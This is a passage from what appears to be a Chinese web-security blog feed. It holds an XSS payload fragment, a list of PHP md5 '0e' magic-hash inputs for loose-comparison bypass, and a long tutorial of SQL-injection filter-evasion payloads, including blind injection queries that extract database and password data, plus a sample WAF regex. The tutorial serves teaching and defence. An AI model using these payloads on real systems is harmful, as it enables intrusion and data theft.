<pre><code>&lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code></pre>]]></description></item><item><title>md5缺陷0e</title><link>https://lgf.im/posts/web-security/md5-compare-0e/</link><pubDate>Sun, 14 Oct 2018 18:09:46 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/web-security/md5-compare-0e/</guid><description><![CDATA[<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>关于PHP hash比较缺陷详细介绍：http://www.freebuf.com/news/67007.html</p>
<pre><code>0x01 md5(str)
 
QNKCDZO
0e830400451993494058024219903391
  
s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
  
s214587387a
0e848240448830537924465865611904
  
s214587387a
0e848240448830537924465865611904
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675
  
s1885207154a
0e509367213418206700842008763514
  
s1502113478a
0e861580163291561247404381396064
  
s1885207154a
0e509367213418206700842008763514
  
s1836677006a
0e481036490867661113260034900752
  
s155964671a
0e342768416822451524974117254469
  
s1184209335a
0e072485820392773389523109082030
  
s1665632922a
0e731198061491163073197128363787
  
s1502113478a
0e861580163291561247404381396064
  
s1836677006a
0e481036490867661113260034900752
  
s1091221200a
0e940624217856561557816327384675
  
s155964671a
0e342768416822451524974117254469
  
s1502113478a
0e861580163291561247404381396064
  
s155964671a
0e342768416822451524974117254469
  
s1665632922a
0e731198061491163073197128363787
  
s155964671a
0e342768416822451524974117254469
  
s1091221200a
0e940624217856561557816327384675
  
s1836677006a
0e481036490867661113260034900752
  
s1885207154a
0e509367213418206700842008763514
  
s532378020a
0e220463095855511507588041205815
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675
  
s214587387a
0e848240448830537924465865611904
  
s1502113478a
0e861580163291561247404381396064
  
s1091221200a
0e940624217856561557816327384675
  
s1665632922a
0e731198061491163073197128363787
  
s1885207154a
0e509367213418206700842008763514
  
s1836677006a
0e481036490867661113260034900752
  
s1665632922a
0e731198061491163073197128363787
  
s878926199a
0e545993274517709034328855841020
 
 
0x02 md5(md5())
  
0x03 md5(md5(str).&quot;SALT&quot;)
2
0e774261293712168181959463563504</code></pre>]]></description></item><item><title>sql注入针对关键字过滤的绕过技巧</title><link>https://lgf.im/posts/web-security/bypass-tech-for-sql-injection-keyword-filtering/</link><pubDate>Sun, 14 Oct 2018 18:07:45 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/web-security/bypass-tech-for-sql-injection-keyword-filtering/</guid><description><![CDATA[<p>在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p>
<blockquote>
<p>2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加sql注入过滤和检测的几种思路和绕过方法</p>
</blockquote>
<h2 id="过滤空格">过滤空格</h2>
<h3 id="使用注释符绕过">使用注释符<code>/**/</code>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span><span class="cm">/**/</span><span class="n">name</span><span class="cm">/**/</span><span class="k">FROM</span><span class="cm">/**/</span><span class="k">table</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用url编码绕过">使用<strong>url编码</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">%</span><span class="n">a0</span> <span class="err">发出去就是空格的意思，但是需要在</span><span class="n">burp中抓包后修改</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用浮点数绕过">使用<strong>浮点数</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">8</span><span class="n">E0union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>
<span class="err">等价于</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用tab替代空格">使用<strong>Tab</strong>替代空格</h3>
<h3 id="使用两个空格替代一个空格">使用<strong>两个空格</strong>替代一个空格</h3>
<h3 id="使用括号绕过">使用<strong>括号</strong>绕过</h3>
<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。
在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
<p>例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="p">(</span><span class="k">user</span><span class="p">())</span><span class="k">from</span> <span class="n">dual</span> <span class="k">where</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="k">and</span><span class="p">(</span><span class="mi">2</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>这种过滤方法常常用于time based盲注,例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">27</span><span class="k">and</span><span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">(</span><span class="k">database</span><span class="p">()</span><span class="k">from</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">for</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">109</span><span class="p">))</span><span class="o">%</span><span class="mi">23</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤引号">过滤引号</h2>
<h3 id="使用16进制绕过">使用<strong>16进制</strong>绕过</h3>
<p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="k">column_name</span>  <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s2">&#34;users&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
<code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="k">column_name</span>  <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="mi">0</span><span class="n">x7573657273</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤逗号">过滤逗号</h2>
<h3 id="使用from关键字绕过">使用<strong>from关键字</strong>绕过</h3>
<p>对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from to</code>的方式来解决：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">()</span> <span class="k">from</span> <span class="mi">1</span> <span class="k">for</span> <span class="mi">1</span><span class="p">);</span>
<span class="k">select</span> <span class="n">mid</span><span class="p">(</span><span class="k">database</span><span class="p">()</span> <span class="k">from</span> <span class="mi">1</span> <span class="k">for</span> <span class="mi">1</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用join关键字绕过">使用<strong>join关键字</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span>
<span class="err">等价于</span>
<span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用like关键字绕过">使用<strong>like关键字</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">80</span>   <span class="o">#</span><span class="err">等价于</span>
<span class="k">select</span> <span class="k">user</span><span class="p">()</span> <span class="k">like</span> <span class="s1">&#39;r%&#39;</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用offset关键字绕过">使用<strong>offset关键字</strong>绕过</h3>
<p>对于limit可以使用offset来绕过：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">news</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
<span class="err">等价于</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">news</span> <span class="k">limit</span> <span class="mi">1</span> <span class="k">offset</span> <span class="mi">0</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤注释符--和----">过滤注释符（ <code>#</code> 和 <code>--</code> ）</h2>
<h3 id="手动闭合引号不使用注释符">手动闭合引号，不使用注释符</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,3||&#39;</span><span class="mi">1</span>
</code></pre></td></tr></table>
</div>
</div><p>或者：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,&#39;</span><span class="mi">3</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤比较符号---和--">过滤比较符号 （ <code>&lt;</code> 和 <code>&gt;</code> ）</h2>
<h3 id="使用greatestleast函数绕过">使用**<code>greatest()</code>、<code>least（）</code>函数**绕过</h3>
<p>greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p>
<p>最常见的一个盲注的sql语句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">64</span>
</code></pre></td></tr></table>
</div>
</div><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,&hellip;)函数返回输入参数(n1,n2,n3,&hellip;)的最大值</p>
<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">greatest</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">64</span><span class="p">)</span><span class="o">=</span><span class="mi">64</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用between-and绕过">使用**<code>between</code> <code>and</code>**绕过</h3>
<p>between a and b：返回a，b之间的数据，不包含b。</p>
<h2 id="过滤等号--">过滤等号（ <code>=</code> ）</h2>
<h3 id="使用like-rlike-regexp-或者-使用-或者-">使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</h3>
<h2 id="过滤or-and-xor-not">过滤<code>or</code> <code>and</code> <code>xor</code> <code>not</code></h2>
<h3 id="使用符号代替">使用符号代替</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">and</span><span class="o">=`&amp;&amp;`</span>  <span class="k">or</span><span class="o">=`||`</span>   <span class="n">xor</span><span class="o">=`|`</span>   <span class="k">not</span><span class="o">=`!`</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤unionselectwhere等">过滤<code>union</code>，<code>select</code>，<code>where</code>等</h2>
<h3 id="使用注释符绕过-1">使用<strong>注释符</strong>绕过</h3>
<p>常用注释符：</p>
<p><code>//</code>、<code>--</code>、<code>/**/</code>、<code>#</code>、<code>--+</code>、<code>---</code>、<code>;</code>、<code>%00</code>、<code>--a</code></p>
<p>用法：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">U</span><span class="cm">/**/</span> <span class="n">NION</span> <span class="cm">/**/</span> <span class="n">SE</span><span class="cm">/**/</span> <span class="n">LECT</span> <span class="cm">/**/</span><span class="k">user</span><span class="err">，</span><span class="n">pwd</span> <span class="k">from</span> <span class="k">user</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用大小写绕过">使用<strong>大小写</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;UnIoN/**/SeLeCT
</span></code></pre></td></tr></table>
</div>
</div><h3 id="使用内联注释绕过">使用<strong>内联注释</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#
</span></code></pre></td></tr></table>
</div>
</div><h3 id="使用双关键字绕过若删除掉第一个匹配的union就能绕过">使用<strong>双关键字</strong>绕过（若删除掉第一个匹配的union就能绕过）</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;UNIunionONSeLselectECT1,2,3–-
</span></code></pre></td></tr></table>
</div>
</div><h3 id="使用加号拆解字符串">使用<strong>加号+拆解字符串</strong></h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">or</span> <span class="err">‘</span><span class="n">swords</span><span class="err">’</span> <span class="o">=</span><span class="err">‘</span><span class="n">sw</span><span class="err">’</span> <span class="o">+</span><span class="err">’</span> <span class="n">ords</span><span class="err">’</span> <span class="err">；</span><span class="k">EXEC</span><span class="p">(</span><span class="err">‘</span><span class="k">IN</span><span class="err">’</span> <span class="o">+</span><span class="err">’</span> <span class="n">SERT</span> <span class="k">INTO</span> <span class="err">‘</span><span class="o">+</span><span class="err">’</span> <span class="err">…</span><span class="p">..</span><span class="err">’</span> <span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用语法新特性绕过屏蔽select">使用语法新特性绕过屏蔽select</h3>
<p>在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据</p>
<h4 id="table-语句">TABLE 语句</h4>
<p>可以直接列出表的全部内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">TABLE</span> <span class="k">table_name</span> <span class="p">[</span><span class="k">ORDER</span> <span class="k">BY</span> <span class="k">column_name</span><span class="p">]</span> <span class="p">[</span><span class="k">LIMIT</span> <span class="nb">number</span> <span class="p">[</span><span class="k">OFFSET</span> <span class="nb">number</span><span class="p">]]</span>
</code></pre></td></tr></table>
</div>
</div><p>如 <code>select * from user</code> 就可以用 <code>table user</code> 替代来进行绕过</p>
<h4 id="values-语句">VALUES 语句</h4>
<p>可以列出一行的值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">VALUES</span> <span class="n">row_constructor_list</span> <span class="p">[</span><span class="k">ORDER</span> <span class="k">BY</span> <span class="n">column_designator</span><span class="p">]</span> <span class="p">[</span><span class="k">LIMIT</span> <span class="k">BY</span> <span class="nb">number</span><span class="p">]</span>

<span class="n">row_constructor_list</span><span class="p">:</span>
 <span class="k">ROW</span><span class="p">(</span><span class="n">value_list</span><span class="p">)[,</span> <span class="k">ROW</span><span class="p">(</span><span class="n">value_list</span><span class="p">)][,</span> <span class="p">...]</span>

<span class="n">value_list</span><span class="p">:</span>
 <span class="n">value</span><span class="p">[,</span> <span class="n">value</span><span class="p">][,</span> <span class="p">...]</span>

<span class="n">column_designator</span><span class="p">:</span>
 <span class="n">column_index</span>
</code></pre></td></tr></table>
</div>
</div><p>例如直接列出一行的值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">VALUES</span> <span class="k">ROW</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">),</span> <span class="k">ROW</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>VALUES和TABLES语句的结果都是表数据，可以结合起来使用</p>
</blockquote>
<h2 id="使用编码绕过过滤">使用<strong>编码</strong>绕过过滤</h2>
<p>如<code>URLEncode</code>编码，<code>ASCII</code>,<code>HEX</code>,<code>unicode</code>编码绕过</p>
<p><code>or 1=1</code>即<code>%6f%72%20%31%3d%31</code>，而<code>Test</code>也可以为<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code></p>
<h2 id="使用等价函数绕过过滤">使用<strong>等价函数</strong>绕过过滤</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">hex</span><span class="p">()</span><span class="err">、</span><span class="n">bin</span><span class="p">()</span> <span class="o">==&gt;</span> <span class="n">ascii</span><span class="p">()</span>

<span class="n">sleep</span><span class="p">()</span> <span class="o">==&gt;</span><span class="n">benchmark</span><span class="p">()</span>

<span class="n">concat_ws</span><span class="p">()</span><span class="o">==&gt;</span><span class="n">group_concat</span><span class="p">()</span>

<span class="n">mid</span><span class="p">()</span><span class="err">、</span><span class="n">substr</span><span class="p">()</span> <span class="o">==&gt;</span> <span class="k">substring</span><span class="p">()</span>

<span class="o">@@</span><span class="k">user</span> <span class="o">==&gt;</span> <span class="k">user</span><span class="p">()</span>

<span class="o">@@</span><span class="n">datadir</span> <span class="o">==&gt;</span> <span class="n">datadir</span><span class="p">()</span>

<span class="err">举例：</span><span class="k">substring</span><span class="p">()</span><span class="err">和</span><span class="n">substr</span><span class="p">()</span><span class="err">无法使用时：</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="k">and</span><span class="o">+</span><span class="n">ascii</span><span class="p">(</span><span class="k">lower</span><span class="p">(</span><span class="n">mid</span><span class="p">((</span><span class="k">select</span><span class="o">+</span><span class="n">pwd</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">users</span><span class="o">+</span><span class="k">limit</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">74</span>　

<span class="err">或者：</span>
<span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="s1">&#39;password&#39;</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x70</span>
<span class="n">strcmp</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="mi">0</span><span class="n">x69</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">strcmp</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="mi">0</span><span class="n">x70</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">strcmp</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="mi">0</span><span class="n">x71</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="补充进行过滤的几种思路">补充：进行过滤的几种思路</h2>
<h3 id="黑名单字符替换">黑名单字符替换</h3>
<p>这种是最简单的，针对某些黑名单关键字，直接进行 str_replace</p>
<p>如果替换的不完全，可以用 <code>selselectect</code> 来替换 <code>select</code> 绕过</p>
<h3 id="正则匹配">正则匹配</h3>
<p>在一些waf或者cms会见到类似如下的防护代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&lt;.+javascript:window</span><span class="se">\\</span><span class="s2">[.{1}</span><span class="se">\\\\</span><span class="s2">x|&lt;.*=(&amp;#</span><span class="se">\\</span><span class="s2">d+?;?)+?&gt;|&lt;.*(data|src)=data:text</span><span class="se">\\</span><span class="s2">/html.*&gt;|</span><span class="se">\\</span><span class="s2">b(alert</span><span class="se">\\</span><span class="s2">(|confi
</span><span class="s2">rm</span><span class="se">\\</span><span class="s2">(|expression</span><span class="se">\\</span><span class="s2">(|prompt</span><span class="se">\\</span><span class="s2">(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?</span><span class="se">\\</span><span class="s2">()|&lt;[a-z]+?</span><span class="se">\\</span><span class="s2">b[^&gt;]*?</span><span class="se">\\</span><span class="s2">bon([a-z]{4,})
</span><span class="s2">\s*?=|^</span><span class="se">\\</span><span class="s2">+</span><span class="se">\\</span><span class="s2">/v(8|9)|</span><span class="se">\\</span><span class="s2">b(and|or)</span><span class="se">\\</span><span class="s2">b</span><span class="se">\\</span><span class="s2">s*?([</span><span class="se">\\</span><span class="s2">(</span><span class="se">\\</span><span class="s2">)&#39;</span><span class="se">\&#34;\\</span><span class="s2">d]+?=[</span><span class="se">\\</span><span class="s2">(</span><span class="se">\\</span><span class="s2">)&#39;</span><span class="se">\&#34;\\</span><span class="s2">d]+?|[</span><span class="se">\\</span><span class="s2">(</span><span class="se">\\</span><span class="s2">)&#39;</span><span class="se">\&#34;</span><span class="s2">a-zA-Z]+?=[</span><span class="se">\\</span><span class="s2">(</span><span class="se">\\</span><span class="s2">)&#39;</span><span class="se">\&#34;</span><span class="s2">a-zA-Z]+?|&gt;|&lt;
</span><span class="s2">|\s+?[</span><span class="se">\\</span><span class="s2">w]+?</span><span class="se">\\</span><span class="s2">s+?</span><span class="se">\\</span><span class="s2">bin</span><span class="se">\\</span><span class="s2">b</span><span class="se">\\</span><span class="s2">s*?\(|</span><span class="se">\\</span><span class="s2">blike</span><span class="se">\\</span><span class="s2">b</span><span class="se">\\</span><span class="s2">s+?[</span><span class="se">\&#34;</span><span class="s2">&#39;])|</span><span class="se">\\</span><span class="s2">/</span><span class="se">\\</span><span class="s2">*.*</span><span class="se">\\</span><span class="s2">*</span><span class="se">\\</span><span class="s2">/|&lt;</span><span class="se">\\</span><span class="s2">s*script</span><span class="se">\\</span><span class="s2">b|</span><span class="se">\\</span><span class="s2">bEXEC</span><span class="se">\\</span><span class="s2">b|UNION.+?SELECT(\(|@{1
</span><span class="s2">,2}\w+?\s*|\s+?.+?|.*(`|&#39;|</span><span class="se">\&#34;</span><span class="s2">).+(`|&#39;|</span><span class="se">\&#34;</span><span class="s2">)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|</span><span class="se">\&#34;</span><span class="s2">).*?(`|&#39;|</span><span class="se">\&#34;</span><span class="s2">)\s*)SET|INSER
</span><span class="s2">T</span><span class="se">\\</span><span class="s2">s+INTO.+?VALUES|(SELECT|DELETE).+?FROM\s+?|(CREATE|ALTER|DROP|TRUNCATE)</span><span class="se">\\</span><span class="s2">s+(TABLE|DATABASE)|FROM\s.?|\(select|\(\s
</span><span class="s2">select|\bunion\b|select\s.+?&#34;</span><span class="p">;</span>
